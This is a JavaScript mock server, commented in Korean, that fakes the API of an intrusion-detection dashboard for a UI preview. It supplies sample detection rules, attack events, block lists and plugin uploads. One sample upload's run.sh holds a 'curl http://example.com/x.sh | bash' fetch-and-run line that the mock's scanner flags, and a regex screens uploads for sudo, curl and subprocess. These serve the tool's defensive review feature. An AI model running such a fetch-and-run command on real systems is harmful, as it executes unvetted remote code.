/* 미리보기 전용 가짜 서버: 실제 WARDEN/대시보드 서버 없이 화면을 확인하기 위한 것.
   모든 데이터는 메모리에만 있고 새로고침하면 처음 상태로 돌아간다. */
(function () {
  Storage.prototype.getItem = function (k) { return k === "gd_token" ? "preview" : null; };
  Storage.prototype.setItem = function () {};

  const now = () => Math.floor(Date.now() / 1000);
  const iso = (t) => new Date(t * 1000 - new Date().getTimezoneOffset() * 60000).toISOString().slice(0, 19);
  const t0 = now();
  let dryRun = true;

  const B = (id, name, desc, severity, block, extra) => ({id, detector: id, name, description: desc, enabled: true, severity, block, ...extra});
  const rules = [
    B("port_scan", "포트 스캔", "짧은 시간에 여러 포트를 두드려 열린 문을 찾는 행위 (nmap 등)", "warning", true, {tags: ["포트스캔", "정찰"], window_sec: 10, distinct_ports: 20}),
    B("syn_flood", "SYN 플러드", "연결 요청(SYN)을 쏟아부어 서버를 마비시키는 공격. 출발지를 위조한 경우는 합계로 따로 감시", "critical", true,
      {tags: ["플러드", "DoS"], window_sec: 5, max_syn: 200, global_max_syn: 1000, global_min_sources: 10, block_duration_sec: 36000}),
    B("icmp_flood", "핑 플러드", "ping 을 대량으로 보내 네트워크를 가득 채우는 공격", "warning", true, {tags: ["핑", "플러드", "DoS"], window_sec: 5, max_packets: 50}),
    B("ssh_bruteforce", "SSH 무차별 대입", "SSH 로그인을 계속 시도해 비밀번호를 알아내려는 공격", "critical", true, {tags: ["SSH", "무차별대입", "계정탈취"], ports: [22], window_sec: 60, max_attempts: 10, block_permanent: true}),
    B("ssh_login_success", "SSH 로그인 성공 (공격 뒤)", "로그인 실패가 반복되던 IP 에서 SSH 로그인이 성공하면 알림 (sshd 로그를 읽음)", "critical", true, {tags: ["SSH", "계정탈취", "로그인"], window_sec: 600, min_failures: 5}),
    B("arp_spoof", "ARP 스푸핑", "같은 IP 의 MAC 주소를 속여 통신을 가로채려는 공격", "critical", true, {tags: ["ARP", "중간자공격"]}),
    B("exfiltration", "대량 데이터 유출", "서버에서 외부로 비정상적으로 많은 데이터가 나가는 상황 (알림만)", "warning", false, {tags: ["유출", "데이터"], window_sec: 60, max_bytes: 50000000}),
    {id: "telnet_probe", detector: "custom", name: "텔넷 접속 시도", description: "예제 규칙: 23번 포트로 새 연결을 반복해서 시도하면 알림 (꺼진 상태로 제공)",
      tags: ["텔넷", "포트공격", "예제"], enabled: false, protocol: "tcp", dst_ports: [23], tcp_flags: "syn", count: 5, window_sec: 30, distinct: "none", severity: "warning", block: false},
  ];
  const events = [
    {id: "e3", timestamp: iso(t0 - 120), type: "icmp_flood", severity: "warning", source: "192.168.56.20", target: "192.168.56.10", detail: "5초 동안 ping 61개", action: "block(dry-run)"},
    {id: "e2", timestamp: iso(t0 - 600), type: "ssh_bruteforce", severity: "critical", source: "192.168.56.20", target: "192.168.56.10", detail: "60초 동안 SSH 접속 시도 12회", action: "block(dry-run)"},
    {id: "e1", timestamp: iso(t0 - 900), type: "port_scan", severity: "warning", source: "192.168.56.20", target: "192.168.56.10", detail: "10초 동안 서로 다른 포트 20개에 접속 시도", action: "block(dry-run)"},
  ];
  const blocked = {
    "192.168.56.20": {reason: "icmp_flood", since: t0 - 120, until: t0 + 180, permanent: false},
    "192.168.56.30": {reason: "manual", since: t0 - 3000, until: null, permanent: true},
  };
  const notes = {"192.168.56.30": "시연 중 SSH 공격자"};
  const wl = ["127.0.0.1", "192.168.56.10", "192.168.57.1", "192.168.57.10"];
  const changes = [];
  const plugins = [
    {id: "heartbeat", name: "하트비트 (서비스 예제)", description: "중지할 때까지 계속 실행되는 '서비스형' 플러그인 예제입니다. 서버 부하를 그래프로 보여 줍니다 (@gui chart). 새 플러그인을 만들 때 참고하세요.", kind: "service",
      tags: ["예제", "서비스"], params: [{name: "interval", label: "출력 간격(초)", type: "int", default: 2}]},
    {id: "net_connections", name: "현재 접속 목록", description: "서버가 열고 있는 포트와 현재 연결(ss)을 보여줍니다.", kind: "task", tags: ["네트워크", "포트", "점검"], params: []},
    {id: "ping_check", name: "핑 확인", description: "지정한 IP 로 ping 3번을 보내 연결 상태를 확인합니다.", kind: "task", tags: ["핑", "연결확인"],
      params: [{name: "host", label: "대상 IP", type: "ip", default: "192.168.56.20"}]},
    {id: "system_info", name: "시스템 상태", description: "가동 시간, 디스크, 메모리 사용량을 보여줍니다.", kind: "task", tags: ["시스템", "점검"], params: []},
    {id: "port_attack_demo", name: "포트 스캔 시연 (예시)", description: "공격자 VM 에서 서버로 포트 스캔을 쏘는 시연용 도구의 모양 예시입니다 (미리보기 전용).", kind: "task",
      tags: ["포트공격", "시연", "공격자VM"], params: [{name: "host", label: "대상 IP", type: "ip", default: "192.168.56.10"}]},
  ];
  const runs = {}, timers = {};
  const history = {
    "192.168.56.20": {total: 3, blocks: 3, by_type: {port_scan: 1, ssh_bruteforce: 1, icmp_flood: 1}, first: iso(t0 - 900), last: iso(t0 - 120)},
    "192.168.56.30": {total: 1, blocks: 1, by_type: {manual_block: 1}, first: iso(t0 - 3000), last: iso(t0 - 3000)},
  };

  const SAMPLE = {
    system_info: ['@gui {"type":"metric","label":"가동 시간","value":"34 minutes"}', '@gui {"type":"metric","label":"디스크(/) 사용","value":19.2,"unit":"%","max":100}',
      '@gui {"type":"metric","label":"메모리 사용","value":65.5,"unit":"%","max":100}', '@gui {"type":"metric","label":"부하(1분) / CPU 2개","value":0.42,"max":2}',
      '@gui {"type":"bars","title":"부하 평균","items":[["1분",0.42],["5분",0.35],["15분",0.3]]}',
      '@gui {"type":"table","title":"용량","columns":["항목","전체","사용","남음"],"rows":[["디스크(/)","78 GB","15 GB","58 GB"],["메모리","5900 MB","3865 MB","2035 MB"]]}',
      "== 가동 시간 ==", "up 34 minutes", "", "== 디스크(/) ==", "전체 78 GB / 사용 15 GB / 남음 58 GB", "", "== 메모리 ==", "Mem: 1.9Gi used / 1.0Gi available"],
    net_connections: ["tcp LISTEN 0 128 0.0.0.0:22", "tcp LISTEN 0 5 192.168.57.10:8080", "tcp ESTAB 0 0 192.168.57.10:8080 192.168.57.1:50317"],
    ping_check: ["PING 192.168.56.20 56(84) bytes of data.", "64 bytes from 192.168.56.20: icmp_seq=1 ttl=64 time=0.4 ms", "3 packets transmitted, 3 received, 0% packet loss"],
  };

  // 승인 대기 중인 플러그인 예시 (실제로는 서버 터미널의 approve_plugin.py 로만 승인)
  const uploads = [{id: "demo_rule", type: "rule", name: "예시 규칙", description: "예시 업로드 (플러그인 방식 규칙)", kind: "rule", tags: ["로그인", "계정"], short: "5a4b3c2d1e0f", hash: "5a4b3c2d1e0f", intact: true,
    uploaded_at: iso(now() - 300), uploader: "192.168.57.1", rule: {severity: "warning", block: false, interval_sec: 10, command: ["./check_demo.py"]},
    files: [{name: "rule.json", size: 190, sha256: "333333333333"}, {name: "check_demo.py", size: 120, sha256: "444444444444"}], findings: [],
    texts: {"rule.json": '{\n  "id": "demo_rule",\n  "detector": "script",\n  "command": ["./check_demo.py"],\n  "interval_sec": 10\n}',
            "check_demo.py": 'import json\nprint(json.dumps({"source": "192.168.56.99", "detail": "예시 판정"}))\n'}},
    {id: "demo_scan", type: "tool", name: "데모 스캔", description: "예시 업로드", kind: "task", tags: ["포트공격"], short: "9f8e7d6c5b4a", hash: "9f8e7d6c5b4a", intact: true,
    uploaded_at: iso(now() - 600), uploader: "192.168.57.1",
    files: [{name: "plugin.json", size: 210, sha256: "111111111111"}, {name: "run.sh", size: 64, sha256: "222222222222"}],
    findings: [{file: "run.sh", line: 2, what: "외부 통신 도구", text: "curl http://example.com/x.sh | bash"}],
    texts: {"plugin.json": '{\n  "id": "demo_scan",\n  "name": "데모 스캔",\n  "command": ["bash", "./run.sh"]\n}', "run.sh": "#!/usr/bin/env bash\ncurl http://example.com/x.sh | bash\n"}}];

  // 침입 상세 분석(미리보기용 예시): 실제 분석은 warden.py 의 analyze_event 가 만든다
  const AN = {
    icmp_flood: {name: "핑 플러드", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "MAC 주소: 08:00:27:aa:bb:cc (ARP 로 확인)", "목표: 이 서버 192.168.56.10"],
      what: ["ping(ICMP)을 대량으로 보내 네트워크 회선과 CPU 를 소모시키는 공격입니다."], burden: "보통", impact: ["램 부담은 비교적 작지만 회선과 CPU 를 채워 정상 통신이 느려질 수 있습니다."]},
    ssh_bruteforce: {name: "SSH 무차별 대입", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "목표: 이 서버 192.168.56.10 (포트 22)"],
      what: ["SSH 로그인(보통 22번 포트)을 계속 시도하며 비밀번호를 하나씩 대입해 보는 공격입니다."], burden: "낮음",
      impact: ["서버 부담보다 '계정 탈취' 위험이 큰 공격입니다.", "이 표시는 '접속 시도'를 센 것입니다. 로그인이 실제로 성공하면 'SSH 로그인 성공' 탐지가 따로 뜹니다."]},
    port_scan: {name: "포트 스캔", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "목표: 이 서버 192.168.56.10 (포트 1000, 1001, 1002 …)"],
      what: ["서버에서 열려 있는 문(포트)을 찾으려고 여러 포트를 차례로 두드리는 정찰 행위입니다 (nmap 같은 도구)."], burden: "낮음",
      impact: ["스캔 자체는 서버의 램·CPU 에 큰 부담을 주지 않습니다.", "하지만 열려 있는 서비스가 공격자에게 알려져 다음 공격의 표적이 됩니다."]},
  };
  function analysisFor(ev) {
    const a = AN[ev.type] || AN.port_scan, isBlocked = ev.source in blocked && !dryRun;
    const head = isBlocked ? {level: "good", text: "성공적으로 막아냈습니다."}
      : {level: "bad", text: "막지 못했고 공격이 계속되고 있습니다. 서버 부담이 이어질 수 있어 IP 차단을 추천합니다."};
    return {event: ev, name: a.name, headline: head, burden: a.burden, recent_packets: isBlocked ? 0 : 38,
      server_now: {mem_percent: 41.3, load1: 0.52, cpus: 2}, actions: {can_block: !isBlocked, target: ev.source},
      sections: [{title: "📍 어디서 공격했나", lines: a.where}, {title: "⚔️ 어떤 공격인가", lines: [...a.what, ev.detail]},
        {title: "💥 서버에 준 영향", lines: ["5초 동안 61개 (탐지 기준 50개의 1.2배)", `서버 부담(램·CPU·회선) 추정: ${a.burden} — 실제로 잰 값이 아니라 공격 종류와 횟수로 짐작한 값입니다.`, ...a.impact]},
        {title: "🛡️ 대응 결과", lines: isBlocked ? ["방화벽(iptables)이 이 IP 를 차단했습니다 (180초 남음)."]
          : ["dry-run(탐지만) 모드라 실제로 막지 않았습니다. 이 공격은 그대로 서버에 들어왔습니다.", "지금 상태: 최근 10초 동안 이 출발지에서 온 패킷 38개 (공격이 계속되는 중)"]},
        {title: "✅ 권고", lines: ["🚫 이 IP 차단을 추천합니다 (아래 버튼 또는 '보안 정책 제어').", "같은 출발지가 3번 탐지된 반복 공격자입니다. 영구 차단을 고려하세요.",
          "지금은 dry-run(탐지만) 모드입니다. 실제로 막으려면 왼쪽 '개요' 메뉴의 '관제 서버 상태' 슬라이드를 '실제 차단'으로 바꾸세요."]}],
      evidence: [["이벤트 ID", ev.id], ["발생 시각", ev.timestamp.replace("T", " ")], ["탐지 유형", ev.type], ["위험도", ev.severity], ["출발지", ev.source], ["당시 조치", ev.action], ["상세", ev.detail]]};
  }

  // 패킷 보기용 가짜 패킷: 조회할 때마다 핑(요청+응답)과 가끔 TCP 를 새로 만들어 쌓는다
  const pk = [];
  let pkSeq = 0, pkPing = 0, pkAt = now() - 8;
  const addPk = (o) => { pk.push({seq: ++pkSeq, time: Date.now() / 1000, len: 98, ...o}); if (pk.length > 500) pk.shift(); };
  function tickPk() {
    for (; pkAt < now(); pkAt++) {
      pkPing++;
      addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "ICMP", info: `Echo request (ping 요청) id=0x1a2b seq=${pkPing}`});
      addPk({src: "192.168.56.10", dst: "192.168.56.20", dir: "out", proto: "ICMP", info: `Echo reply (ping 응답) id=0x1a2b seq=${pkPing}`});
      if (pkPing % 4 === 0) addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "TCP", sport: 41000 + pkPing, dport: 22, len: 60, info: `${41000 + pkPing} → 22 [SYN]`});
      if (pkPing % 7 === 0) addPk({src: "192.168.56.20", dst: "192.168.56.10", dir: "in", proto: "ARP", len: 42, info: "Who has 192.168.56.10? Tell 192.168.56.20"});
    }
  }

  function log(rule, detail) { changes.push({timestamp: iso(now()), rule, detail}); }
  function reply(obj, code) {
    return Promise.resolve(new Response(JSON.stringify(obj), {status: code || 200, headers: {"Content-Type": "application/json"}}));
  }
  function bookkeep(h) {
    return Object.entries(h).map(([k, a]) => ({source: k, total: a.total, blocks: a.blocks, by_type: a.by_type, first: a.first, last: a.last,
      note: notes[k] || "", blocked_now: k in blocked})).sort((a, b) => b.total - a.total);
  }

  window.fetch = function (url, opts) {
    const u = new URL(url, "http://x"), p = u.pathname, post = opts && opts.method === "POST";
    const body = post && opts.body ? JSON.parse(opts.body) : {};
    if (!post) {
      if (p === "/api/status") return reply({status: "running", uptime_sec: now() - t0 + 5400, interface: "eth0", my_ip: "192.168.56.10", dry_run: dryRun,
        blocked_count: Object.keys(blocked).length, stats: {events_total: events.length, blocks_auto: 0, blocks_auto_sim: 3, packets_total: 48210 + (now() - t0) * 40},
        whitelist: wl, whitelist_fixed: ["127.0.0.1", "192.168.56.10", "192.168.57.10"], utc_offset: "+09:00", server: {mem_percent: 41.3, load1: 0.52, cpus: 2}, missed_packets: 0, notes: {...notes}});
      if (p === "/api/events") {
        if (now() - t0 > 12 && !events.some((e) => e.id === "e9"))                       // 미리보기에서 새 위협 알림을 볼 수 있게 한 번 추가
          events.unshift({id: "e9", timestamp: iso(now()), type: "ssh_login_success", severity: "critical", source: "192.168.56.20", target: "192.168.56.10", detail: "로그인 실패 6회 뒤 'kali' 계정 로그인 성공 (password)", action: "block(dry-run)"});
        const src = u.searchParams.get("source");
        return reply({events: src ? events.filter((e) => e.source === src) : events});
      }
      if (p === "/api/whoami") return reply({ip: "192.168.57.1"});
      if (p === "/api/audit") return reply({audit: [{time: iso(now() - 300), ip: "192.168.57.1", action: "/api/block", detail: {target: "192.168.56.30", permanent: true}, code: 200}, {time: iso(now() - 900), ip: "192.168.57.9", action: "login_failed", detail: {}, code: 401}]});
      if (p === "/api/pcap") return reply({error: "미리보기에는 실제 패킷 기록이 없어 PCAP 파일을 만들 수 없습니다 (서버의 대시보드에서 받으세요)"}, 404);
      if (p === "/api/packets") {
        tickPk();
        const since = +u.searchParams.get("since") || 0, proto = u.searchParams.get("proto") || "", ip = u.searchParams.get("ip") || "";
        const hide = (u.searchParams.get("hide_ports") || "").split(",").filter(Boolean).map(Number);
        const rows = pk.filter((x) => x.seq > since && (!proto || x.proto === proto) && (!ip || x.src.startsWith(ip) || x.dst.startsWith(ip))
          && !hide.includes(x.sport) && !hide.includes(x.dport));
        return reply({enabled: true, packets: rows.slice(-200), last_seq: pkSeq, buffer: 2000, unrecorded: 0, my_ip: "192.168.56.10"});
      }
      if (p === "/api/blocked") return reply({blocked: Object.entries(blocked).map(([k, v]) => ({target: k, reason: v.reason, since: iso(v.since),
        permanent: v.permanent, note: notes[k] || "", until: v.until && iso(v.until), remaining_sec: v.until === null ? null : v.until - now()})), simulated: dryRun});
      if (p === "/api/history") return reply({history: bookkeep(history)});
      if (p === "/api/rules") return reply({dry_run: dryRun, rules, errors: {}, default_block_sec: 300, hits: Object.fromEntries(rules.filter((r) => events.some((e) => e.type === r.id)).map((r) => [r.id, {count: events.filter((e) => e.type === r.id).length, last: events.find((e) => e.type === r.id).timestamp}]))});
      if (p === "/api/rule_changes") return reply({changes: [...changes].reverse()});
      if (p === "/api/event_analysis") {
        const ev = events.find((e) => e.id === u.searchParams.get("id"));
        return ev ? reply(analysisFor(ev)) : reply({error: "이벤트를 찾을 수 없습니다"}, 404);
      }
      if (p === "/api/plugin_uploads") return reply({uploads: uploads.map(({texts, ...rest}) => rest)});
      const up = p.match(/^\/api\/plugin_uploads\/([a-z0-9_]+)$/);
      if (up) { const x = uploads.find((y) => y.id === up[1]); return x ? reply(x) : reply({error: "없는 승인 대기 항목"}, 404); }
      if (p === "/api/plugins") return reply({errors: {}, plugins: plugins.map((pl) => ({...pl, running: !!timers[pl.id], last_run: runs[pl.id] || null}))});
      return reply({error: "not found"}, 404);
    }
    if (p === "/api/plugin_uploads") {
      const f = body.files || {}, isRule = "rule.json" in f, pj = isRule ? f["rule.json"] : f["plugin.json"];
      if (!pj) return reply({error: "plugin.json (도구) 또는 rule.json (탐지 규칙) 이 필요합니다"}, 400);
      if (body.expect && body.expect !== (isRule ? "rule" : "tool")) return reply({error: "이 칸에는 " + (body.expect === "tool" ? "plugin.json (도구)" : "rule.json (탐지 규칙)") + " 을 올려야 합니다"}, 400);
      let m; try { m = JSON.parse(pj); } catch (e) { return reply({error: (isRule ? "rule.json" : "plugin.json") + " 형식 오류: " + e.message}, 400); }
      const u = {id: m.id, type: isRule ? "rule" : "tool", name: m.name || m.id, description: m.description || "", kind: isRule ? "rule" : (m.kind || "task"), tags: m.tags || [], short: "a1b2c3d4e5f6", hash: "a1b2c3d4e5f6", intact: true,
        uploaded_at: iso(now()), uploader: "192.168.57.1", files: Object.keys(f).map((n) => ({name: n, size: f[n].length, sha256: "0123456789ab"})),
        findings: Object.entries(f).flatMap(([n, t]) => t.split("\n").flatMap((l, i) => /sudo|curl|subprocess/.test(l) ? [{file: n, line: i + 1, what: "검토 필요 패턴", text: l.trim()}] : [])), texts: f};
      uploads.push(u); return reply({ok: true, upload: u});
    }
    if (/^\/api\/plugin_uploads\/[a-z0-9_]+\/run_sandboxed$/.test(p)) return new Promise((res) => setTimeout(() => res(reply({rc: 0, timed_out: false, findings: [], output: "(미리보기) 격리 상태에서 실행한 출력 예시\n{\"source\": \"192.168.56.99\", \"detail\": \"예시 판정\"}\n"})), 1500));
    const upd = p.match(/^\/api\/plugin_uploads\/([a-z0-9_]+)\/delete$/);
    if (upd) { const i = uploads.findIndex((x) => x.id === upd[1]); if (i >= 0) uploads.splice(i, 1); return reply({ok: i >= 0}); }
    if (p === "/api/block") {
      const cur = blocked[body.target];
      if (cur && !body.overwrite) return reply({ok: false, exists: true, reason: "이미 차단 중", current: {reason: cur.reason, since: iso(cur.since),
        permanent: cur.permanent, note: notes[body.target] || "", remaining_sec: cur.until === null ? null : cur.until - now()}});
      blocked[body.target] = {reason: body.reason || "manual", since: now(), until: body.permanent ? null : now() + body.duration_sec, permanent: !!body.permanent};
      if (body.note) notes[body.target] = body.note;
      return reply({ok: true});
    }
    if (p === "/api/unblock") { const ok = delete blocked[body.target]; return reply({ok}); }
    if (p === "/api/note") { if (body.note) notes[body.target] = body.note; else delete notes[body.target]; return reply({ok: true}); }
    if (p === "/api/dry_run") { const changed = dryRun !== body.dry_run; dryRun = body.dry_run; return reply({ok: true, dry_run: dryRun, changed}); }
    if (p === "/api/whitelist") {
      const t = String(body.target || "").replace(/^mac:/, "");
      if (body.action === "add") {
        if (wl.includes(t)) return reply({ok: false, reason: "이미 화이트리스트에 있습니다"});
        wl.push(t); wl.sort(); const freed = t in blocked; delete blocked[t]; log("whitelist", "추가: " + t);
        return reply({ok: true, reason: "", unblocked: freed, whitelist: wl});
      }
      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (WARDEN 이 자기 자신을 차단하게 됩니다)"});
      const i = wl.indexOf(t);
      if (i < 0) return reply({ok: false, reason: "화이트리스트에 없습니다"});
      wl.splice(i, 1); log("whitelist", "삭제: " + t);
      return reply({ok: true, reason: "", unblocked: false, whitelist: wl});
    }
    if (p === "/api/rules/enable") { const r = rules.find((x) => x.id === body.id); r.enabled = body.enabled; log(r.id, body.enabled ? "켜짐" : "꺼짐"); return reply({ok: true}); }
    if (p === "/api/rules/update") {
      const i = rules.findIndex((x) => x.id === body.id);
      if (i < 0) return reply({ok: false, reason: "없는 규칙"});
      const old = rules[i], nw = {...body.rule, id: old.id, detector: old.detector, enabled: old.enabled};
      if (nw.notify && !Object.keys(nw.notify).length) delete nw.notify;
      const strip = (o) => JSON.stringify(Object.entries(o).filter(([k, v]) => k !== "notify" && v !== undefined).sort());
      if (strip(nw) === strip(old) && JSON.stringify(nw.notify || {}) !== JSON.stringify(old.notify || {})) {
        rules[i] = nw; log(old.id, "알림 설정 변경"); return reply({ok: true, changed: true, was_enabled: old.enabled, kept_enabled: true});
      }
      if (!nw.block) { delete nw.block_duration_sec; delete nw.block_permanent; } else if (nw.block_permanent) delete nw.block_duration_sec;
      for (const k of ["count", "window_sec"]) if (k in nw && !(nw[k] >= 1)) return reply({error: `'${k}' 는 1 이상의 정수여야 합니다`}, 400);
      const same = JSON.stringify(Object.entries(nw).filter(([, v]) => v !== undefined).sort()) === JSON.stringify(Object.entries(old).sort());
      if (same) return reply({ok: true, changed: false, was_enabled: old.enabled});
      const was = old.enabled; rules[i] = {...nw, enabled: false};
      log(old.id, was ? "수정됨 (자동으로 꺼짐)" : "수정됨 (꺼짐 상태 유지)");
      return reply({ok: true, changed: true, was_enabled: was});
    }
    if (p === "/api/rules/delete") {
      const i = rules.findIndex((x) => x.id === body.id);
      if (i < 0) return reply({ok: false, reason: "없는 규칙"});
      const was = rules[i].enabled;
      if (was) log(body.id, "꺼짐 (삭제 전 자동 비활성화)");
      rules.splice(i, 1); log(body.id, "삭제됨"); return reply({ok: true, was_enabled: was});
    }
    if (p === "/api/rules") {
      const r = body.rule, i = rules.findIndex((x) => x.id === r.id);
      if (i >= 0) return reply({error: `이미 있는 규칙 ID 입니다: ${r.id}`}, 409);
      const full = {detector: "custom", ...r};
      if (!full.block) { delete full.block_duration_sec; delete full.block_permanent; } else if (full.block_permanent) delete full.block_duration_sec;
      if (i >= 0) rules[i] = full; else rules.push(full);
      log(r.id, i >= 0 ? "수정됨" : "추가됨"); return reply({ok: true, id: r.id});
    }
    const m = p.match(/^\/api\/plugins\/([\w-]+)\/(run|stop)$/);
    if (m) {
      const [, id, action] = m;
      if (action === "stop") { clearInterval(timers[id]); delete timers[id]; if (runs[id]) runs[id].status = "stopped"; return reply({ok: true}); }
      if (id === "heartbeat") {
        const run = runs[id] = {status: "running", output: [], command: "heartbeat"}; let n = 0;
        timers[id] = setInterval(() => {
          run.output.push(`[${new Date().toTimeString().slice(0, 8)}] 살아있음 #${++n}`,
            `@gui {"type":"chart","label":"부하(1분)","value":${(0.3 + Math.random() * 0.6).toFixed(2)},"max":2}`, `@gui {"type":"metric","label":"보낸 신호","value":${n},"unit":"회"}`);
        }, 2000);
      } else runs[id] = {status: "done", output: SAMPLE[id] || ["(미리보기용 예시 출력)"], command: id};
      return reply({ok: true});
    }
    return reply({error: "not found"}, 404);
  };
})();
